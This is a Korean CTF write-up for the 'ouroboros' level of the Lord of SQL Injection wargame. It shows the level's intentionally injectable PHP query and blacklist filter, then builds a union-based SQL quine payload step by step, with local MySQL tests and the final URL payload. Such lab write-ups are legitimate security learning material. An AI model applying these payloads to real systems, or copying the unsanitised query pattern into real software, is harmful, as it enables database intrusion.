---
title: "[Lord of SQL Injection] LoS - ouroboros 문제풀이"
date: 2018-09-17
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

이번 문제도 테이블이 비어 있었다.
근데 `pw`를 추출하래...
어떻게 하라는지 고민하다가 웹짱해커님께 물어봐서 겨우 풀었다.  

<!--more-->

코드는 다음과 같다.  

```php
----------------------------------------------------------------------
query : select pw from prob_ouroboros where pw=''
----------------------------------------------------------------------

<?php
  include "./config.php";
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\.|rollup|join|@/i', $_GET['pw'])) exit("No Hack ~_~");
  $query = "select pw from prob_ouroboros where pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if($result['pw']) echo "<h2>Pw : {$result[pw]}</h2>";
  if(($result['pw']) && ($result['pw'] === $_GET['pw'])) solve("ouroboros");
  highlight_file(__FILE__);
?>
```

첨에는 문제 보자마자 `오?` 했다.
그래서 신나게 `?pw=1' or pw like '%'%23`을 입력 해 보았다.
그런데 아무런 결과도 나오지 않았다.
보아하니 얘도 테이블을 비워 둔 것 같았다.
그럼.. 내가 입력 한 값이 곧 결과값이 되어야 하는데, 이걸 도저히 어떻게 해야하는지 감이 안잡혔다.

`?pw=1' union select '1`을 입력하면, `Pw : 1`이 출력되서 `뭔가 union을 써야 하는구나...`는 알겠는데 어떻게 해야 내가 입력한 값과 출력 값이 같게 만들 수 있는지를 모르겠더라.
그래서 또 다시 `웹 짱 해커`님한테 물어봤다.
그랬더니 힌트로 `Quine`라는 것을 알려 주었다.  

> [위키백과 - Quine](https://en.wikipedia.org/wiki/Quine_(computing))  

> [SQLi Quine](https://www.shysecurity.com/post/20140705-SQLi-Quine)

인터넷 찾아보니 이 두 가지가 제일 도움이 되었다.
즉, `Quine`은 `자기 자신의 소스코드를 출력하는 것`을 의미한다고 한다.
이번 문제에 딱 맞는 컨셉이다.
그래서 위의 링크 중에 위키백과에서 아래와 같은 쿼리문을 가져와 테스트 해 보았다.  

```mysql
SELECT REPLACE(REPLACE('SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine',CHAR(34),CHAR(39)),CHAR(36),'SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine') AS Quine;
```

그 결과 내가 입력한 내용이 그대로 결과 값으로 나온 것을 확인할 수 있었다.  

```bash
mysql> SELECT REPLACE(REPLACE('SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine',CHAR(34),CHAR(39)),CHAR(36),'SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine') AS Quine; 
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| Quine                                                                                                                                                                                                      |
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| SELECT REPLACE(REPLACE('SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine',CHAR(34),CHAR(39)),CHAR(36),'SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine') AS Quine |
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
1 row in set (0.00 sec)
```

이 것을 바탕으로 문제를 풀기 위해 `SELECT`를 `a' union SELECT`로 변경했다.
그랬더니 `'`와 `"`이 내가 입력한 값과 조금씩 달라졌다.
왜 바뀌는지 도저히 모르겠어서 `REPLACE` 함수를 기준으로 쿼리문을 잘라서 비교 해 보았다.
쿼리를 살펴 보면 `$`가 있는데, 앞의 두 `$` 자리에 마지막의 `SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine`가 `REPLACE` 되어 들어가게 된다.
그 과정에서 `"`가 `'`로 바뀌게 되는데, 나는 쿼리의 시작 부분에서 `a' union SELECT`가 필요하므로, 처음에 `a"`로 입력하고 이 후 `REPLACE` 함수를 실행하는 과정에서 `a'`로 바뀌도록 했다.
어차피 뒤의 `a" union SELECT` 부분은 실제로 쿼리가 실행되는 부분이 아니어서 상관없기 때문이다.
그 결과 만들어진 쿼리는 아래와 같다.  

```mysql
select pw from user where pw='a' union SELECT REPLACE(REPLACE('a" union SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine',CHAR(34),CHAR(39)),CHAR(36),'a" union SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine') AS Quine;
```

내가 내 서버에서 테스트 한 쿼리인데 너무 복잡해서 알아보기가 힘든 것 같다.  

```bash
mysql> select pw from user where pw='a' union SELECT REPLACE(REPLACE('a" union SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine',CHAR(34),CHAR(39)),CHAR(36),'a" union SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine') AS Quine;
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| pw                                                                                                                                                                                                                                    |
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| a' union SELECT REPLACE(REPLACE('a" union SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine',CHAR(34),CHAR(39)),CHAR(36),'a" union SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine') AS Quine |
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
1 row in set (0.01 sec)
```

쿼리를 실행 한 결과, 내가 입력 한 쿼리가 그대로 결과 값으로 나온 것을 확인할 수 있다.
드디어 이를 바탕으로 아래와 같은 쿼리스트링을 넘겨주었다.  

```plain
?pw=a' union SELECT REPLACE(REPLACE('a" union SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine%23',CHAR(34),CHAR(39)),CHAR(36),'a" union SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine%23') AS Quine%23
```

이 복잡한 쿼리를 통해 드디어 문제를 풀 수 있었다.  

```php
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
query : select pw from prob_ouroboros where pw='a' union SELECT REPLACE(REPLACE('a" union SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine#',CHAR(34),CHAR(39)),CHAR(36),'a" union SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine#') AS Quine#'
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Pw : a' union SELECT REPLACE(REPLACE('a" union SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine#',CHAR(34),CHAR(39)),CHAR(36),'a" union SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine#') AS Quine#
OUROBOROS Clear!
<?php
  include "./config.php";
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\.|rollup|join|@/i', $_GET['pw'])) exit("No Hack ~_~");
  $query = "select pw from prob_ouroboros where pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if($result['pw']) echo "<h2>Pw : {$result[pw]}</h2>";
  if(($result['pw']) && ($result['pw'] === $_GET['pw'])) solve("ouroboros");
  highlight_file(__FILE__);
?>
```

---

```plain
OUROBOROS Clear!!
```